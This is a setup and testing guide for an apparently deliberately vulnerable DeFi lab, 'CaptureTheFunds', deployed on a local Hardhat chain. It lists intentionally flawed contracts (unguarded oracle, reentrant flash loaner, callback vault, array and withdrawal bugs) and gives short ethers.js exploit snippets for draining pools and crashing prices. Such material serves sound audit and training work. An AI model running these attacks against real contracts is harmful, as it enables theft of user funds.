# CaptureTheFunds - Local Deployment & Testing Guide

## ⚠️ CRITICAL: Before You Proceed

**This guide enables you to test and verify all vulnerabilities identified in the security audit. Do NOT use this on a public network or with real funds.**

---

## Prerequisites

### Required Software:
- **Node.js v16+** (LTS recommended)
- **npm v7+** 
- **git**
- **MetaMask** (optional, for UI interaction)

### Check Installation:
```bash
node --version     # Should be v16.0.0 or higher
npm --version      # Should be v7.0.0 or higher
```

---

## Step 1: Install Dependencies

```bash
# Navigate to project directory
cd path/to/CaptureTheFunds

# Install all npm packages
npm install

# This will install:
# - hardhat: Ethereum development environment
# - ethers: Blockchain interaction library
# - openzeppelin/contracts: Security libraries
# - express: Web server for UI
# - solc: Solidity compiler
# - (and all other dependencies from package.json)
```

**Expected output:**
```
added 500+ packages in 45 seconds
```

---

## Step 2: Start the Local Deployment

### Option A: Automated Start (Recommended)
```bash
# Start backend server (launches Hardhat node + Express)
npm start

# OR directly:
node backend/server.js
```

### Option B: Manual Start (For Debugging)
```bash
# Terminal 1: Start Hardhat blockchain node
npx hardhat node --hostname 127.0.0.1 --port 8545

# Terminal 2: Run deployment script
npx hardhat run scripts/setupInitialState.js --network localhost

# Terminal 3: Start backend server
npm start
```

---

## Step 3: What Gets Deployed

### Blockchain State:
```
Network: Local Hardhat (127.0.0.1:8545)
Chain ID: 31337 (Hardhat default)
Block Time: 1 second (configurable)
Gas Limit: 200M blocks
Initial Timestamp: 2025-01-01 00:00:00 UTC
```

### Accounts (from Hardhat config):
```
Mnemonic: "audit code attack vault avoid trap solve puzzle win trophy eternal glory"

Account 0 (Deployer): 0x1234... (20 ETH)
Account 1: 0x5678... (20 ETH)
Account 2: 0x9ABC... (20 ETH)
... (20 accounts total, each with 20 ETH)
```

### Deployed Contracts:

#### 1. **PriceOracle** 🎯 (VULNERABLE)
```solidity
- Type: Centralized owner-controlled oracle
- Owner: Account 0
- Function: setPrice(token, price) → unrestricted
- Vulnerability: No guards, no timelock, no bounds checking
```

#### 2. **LendingFactory** 
```solidity
- Deploys isolated lending trios
- Each trio has: LendingManager + 2 LendingPools
- Example: USDC/ETH lending pair
```

#### 3. **LendingManager** (with LendingPools A & B)
```solidity
- poolA: USDC (18 decimals initially)
- poolB: ETH (18 decimals)
- Total TVL: ~$100M equivalent (configurable)
```

#### 4. **FlashLoaner** 🎯 (VULNERABLE)
```solidity
- Aggregates liquidity from all pools
- Callback mechanism with NO reentrancy guard
- Fee: 50 basis points (0.5%)
```

#### 5. **ExchangeVault** 🎯 (VULNERABLE)
```solidity
- DEX-like pool system
- Multiple trading pairs
- unlock() callback with unrestricted external calls
```

#### 6. **AuctionManager** 🎯 (VULNERABLE)
```solidity
- English auctions
- Dutch auctions
- NFT vault integration
```

#### 7. **InvestmentVault** 🎯 (VULNERABLE)
```solidity
- Market allocation system
- Timelock delays for operations
- Array-based market management
```

#### 8. **CommunityInsurance**
```solidity
- Bad debt coverage system
- Liquidation endpoint (non-functional - missing liquidate())
```

#### 9. **Lottery**
```solidity
- Gambling contract
- Commit-reveal mechanism
- Prize pool: 2M USDC equivalent
```

### Sample Tokens Deployed:
```
USDC: 1B initial supply (distributed to accounts)
WETH: 1B initial supply (distributed to accounts)
Other tokens as needed per trio
```

---

## Step 4: Access the UI

Once deployment completes:

```
Open browser to: http://localhost:3000
```

You'll see:
- Dashboard with contract balances
- Pool information
- User position tracking
- Transaction history
- Console output from smart contracts

---

## Step 5: Exploit the Vulnerabilities

### Exploit 1: Price Oracle Attack ($210M theoretical)

```javascript
// Connect to local network
const provider = new ethers.providers.JsonRpcProvider("http://127.0.0.1:8545");
const signer = provider.getSigner(0);  // Account 0 (owner)

// Get oracle contract
const oracle = OracleContract.connect(signer);

// Crash all prices
await oracle.setPrice(USDC, ethers.utils.parseEther("0.0001"));
await oracle.setPrice(ETH, ethers.utils.parseEther("0.0001"));

// All positions now liquidatable
// Check lending pools for health factor changes
```

**Test Script:** See ATTACK_PROOFS_OF_CONCEPT.md for full code

---

### Exploit 2: FlashLoan Reentrancy Attack ($65M theoretical)

```javascript
// Deploy reentrancy exploit contract
const exploit = await ReentrancyExploit.deploy(flashLoaner.address, usdc.address);

// Start attack
await exploit.stealLiquidity(ethers.utils.parseEther("5000000"));

// Check balance
const stolen = await usdc.balanceOf(exploit.address);
console.log("Stolen:", ethers.utils.formatEther(stolen), "USDC");
```

**Expected:** Drain all available pool cash

---

### Exploit 3: Exchange Callback Attack ($125M theoretical)

```javascript
// Deploy callback exploit
const exploit = await CallbackExploit.deploy(exchangeVault.address, pool.address);

// Execute via unlock callback
await exploit.attack();

// Verify extraction
const tokens = await exploit.getExtractedTokens();
```

**Expected:** Extract full pool liquidity with minimal deposit

---

### Exploit 4: Array Bug Attack ($50M theoretical)

```javascript
// Deploy malicious market
const badMarket = await MaliciousMarket.deploy(vault.address);

// Submit for addition
await vault.submitMarketAddition(badMarket.address, ethers.utils.parseEther("10000000"));

// Wait for timelock (skip in testing)
// await helpers.time.increase(1 * 24 * 60 * 60);

// Accept (triggers array bug)
await vault.acceptMarketAddition(badMarket.address);

// Exploit corrupted array
await vault.reallocate([...]);
```

**Expected:** Array indices corrupt, caps bypassed, funds drained

---

### Exploit 5: Withdrawal Bug ($5M theoretical)

```javascript
// Setup
await auctionManager.depositERC20(usdc, ethers.utils.parseEther("1000"));

// Trigger strategy loss (or use oracle)
await oracle.setPrice(usdc, ethers.utils.parseEther("0.5"));

// Withdraw
const tx = await auctionManager.withdrawERC20(usdc, ethers.utils.parseEther("1000"));

// Check received amount vs burned shares
// Expected: Receive less than expected due to bug
```

---

## Step 6: Monitoring During Exploitation

### Watch Contract Events:
```javascript
// Listen to deposits/withdrawals
lendingPool.on("Deposit", (user, amount, receiver, shares) => {
  console.log(`Deposit: ${user} - ${ethers.utils.formatEther(amount)} USDC`);
});

lendingPool.on("Withdraw", (sender, receiver, owner, assets, shares) => {
  console.log(`Withdraw: ${owner} - ${ethers.utils.formatEther(assets)} USDC`);
});

// Listen to flashloan
flashloaner.on("FlashLoan", (asset, amount, fee) => {
  console.log(`FlashLoan: ${ethers.utils.formatEther(amount)} - Fee: ${fee}`);
});

// Listen to liquidations
lendingManager.on("Liquidated", (user, amount) => {
  console.log(`Liquidation: ${user} - ${ethers.utils.formatEther(amount)}`);
});
```

### Check Pool State:
```javascript
// Get pool cash
const cash = await lendingPool.getCash();
console.log("Pool Cash:", ethers.utils.formatEther(cash));

// Get total assets
const assets = await lendingPool.totalAssets();
console.log("Total Assets:", ethers.utils.formatEther(assets));

// Get utilization
const borrowed = await lendingPool.totalBorrowNormalized();
console.log("Borrowed (normalized):", ethers.utils.formatEther(borrowed));
```

---

## Step 7: Verify Vulnerabilities

### Checklist for Each Attack:

#### ✓ Price Oracle Attack
```
[ ] Can call setPrice() without timelock
[ ] Prices can be set to 0 or any value
[ ] No bounds checking (> 2x or < 0.5x)
[ ] No price feed integration
[ ] All borrowers health factor < 1 after price crash
[ ] Liquidation function missing (can't clear debt)
```

#### ✓ Reentrancy Attack
```
[ ] FlashLoaner callback has no nonReentrant modifier
[ ] Can re-enter flashloan inside callback
[ ] Each iteration extracts pool cash
[ ] No flashloanDepth tracking
[ ] Pool cash depleted after 10-100 calls
```

#### ✓ Callback Attack
```
[ ] ExchangeVault.unlock() allows arbitrary msg.sender.call()
[ ] Callback executes with _unlocked = true
[ ] Can call normally-restricted functions
[ ] Delta tracking gets corrupted
[ ] Can extract full pool value
```

#### ✓ Array Bug Attack
```
[ ] Market array has off-by-one errors
[ ] IdleMarket position can be corrupted
[ ] Reallocation bypasses caps
[ ] Malicious market extracts funds
[ ] Array ends up with wrong markets
```

#### ✓ Withdrawal Bug Attack
```
[ ] withdrawERC20 reassigns 'amount' variable
[ ] User receives less than expected
[ ] Shares burned for full amount
[ ] Difference stuck in contract
```

---

## Step 8: Generate Reports

### Capture Exploitation Data:

```javascript
// Log all transactions
const txs = [];
provider.on("block", (blockNumber) => {
  provider.getBlock(blockNumber).then(block => {
    block.transactions.forEach(tx => {
      txs.push({
        hash: tx,
        timestamp: block.timestamp,
        miner: block.miner
      });
    });
  });
});

// Export for analysis
fs.writeFileSync("exploitation_log.json", JSON.stringify(txs, null, 2));
```

### Take Snapshots:

```bash
# After each exploit, snapshot state
curl -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"evm_snapshot","params":[],"id":1}'

# Later, revert to snapshot
curl -X POST http://localhost:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"evm_revert","params":["0x..."],"id":1}'
```

---

## Troubleshooting

### Issue: "Cannot find module 'hardhat'"
```bash
# Solution: Reinstall dependencies
rm -rf node_modules package-lock.json
npm install
```

### Issue: Port 8545 already in use
```bash
# Solution: Kill existing process
# Windows:
netstat -ano | findstr :8545
taskkill /PID <PID> /F

# Mac/Linux:
lsof -i :8545
kill -9 <PID>
```

### Issue: "Insufficient gas"
```bash
# Solution: Increase gas limits in hardhat.config.js
blockGasLimit: 300000000,
gas: 150000000,
```

### Issue: "Connection refused"
```bash
# Make sure Hardhat node is running:
npx hardhat node --hostname 127.0.0.1 --port 8545

# Check if port is listening:
netstat -an | grep 8545
```

---

## Testing Scripts Provided

Located in `/scripts/`:

```
setupInitialState.js     - Deploys all contracts
setupHelper.js           - Helper functions for setup
```

Run tests:
```bash
# Compile contracts
npx hardhat compile

# Run setup
npx hardhat run scripts/setupInitialState.js --network localhost

# Run tests (if added)
npx hardhat test
```

---

## Network Configuration

### For MetaMask Connection:

1. Open MetaMask
2. Add Custom RPC:
   - Network Name: `Local Hardhat`
   - RPC URL: `http://127.0.0.1:8545`
   - Chain ID: `31337`
   - Currency Symbol: `ETH`

3. Import Accounts:
   - Mnemonic: `audit code attack vault avoid trap solve puzzle win trophy eternal glory`
   - Path: `m/44'/60'/0'/0`

4. Accounts will show with 20 ETH each

---

## Testing Guide

### Phase 1: Basic Testing
```bash
# Verify all contracts deployed
npm start

# Check UI loads at http://localhost:3000
# Check console for deployment logs
```

### Phase 2: Vulnerability Testing
See ATTACK_PROOFS_OF_CONCEPT.md for:
- Complete working exploits
- Step-by-step attack execution
- Expected results
- Transaction logs

### Phase 3: Verification
```
✓ Price oracle can be manipulated
✓ All positions become bad debt
✓ Reentrancy extracts pool cash
✓ Callbacks can manipulate pools
✓ Array operations corrupt state
✓ Withdrawals lose funds
```

---

## Important Notes

### 🔴 DO NOT:
- Deploy to public networks
- Use with real funds
- Expose private keys
- Leave running unattended

### 🟢 DO:
- Test locally only
- Use throwaway mnemonics
- Keep snapshots for regression
- Document all findings

### ⏱️ Timeline:
```
Setup:              5 minutes
Deploy contracts:   2 minutes
Run first exploit:  5 minutes
Verify all bugs:    30 minutes
Generate report:    10 minutes
TOTAL:             ~1 hour
```

---

## Next Steps

After successful deployment:

1. **Verify Vulnerabilities:** Run exploit code from ATTACK_PROOFS_OF_CONCEPT.md
2. **Document Findings:** Screenshot/log all successful attacks
3. **Generate Report:** Create detailed exploitation report
4. **Recommend Fixes:** Use VULNERABILITY_FIXES.md
5. **Create Test Suite:** Add hardhat tests to prevent regressions

---

## References

- [Hardhat Documentation](https://hardhat.org/)
- [Ethers.js Documentation](https://docs.ethers.io/)
- [OpenZeppelin Docs](https://docs.openzeppelin.com/)
- [JSON-RPC API](https://eth.wiki/json-rpc/API)

---

## Support

If issues occur:

1. Check error message in console
2. Verify Node.js version (`node --version`)
3. Check port availability (`netstat -an | grep 8545`)
4. Clear cache: `rm -rf node_modules && npm install`
5. Restart system if stuck

---

**DEPLOYMENT READY**

When you have Node.js installed, run:
```bash
npm install && npm start
```

Then visit: `http://localhost:3000`

All vulnerabilities will be live and ready for exploitation testing.
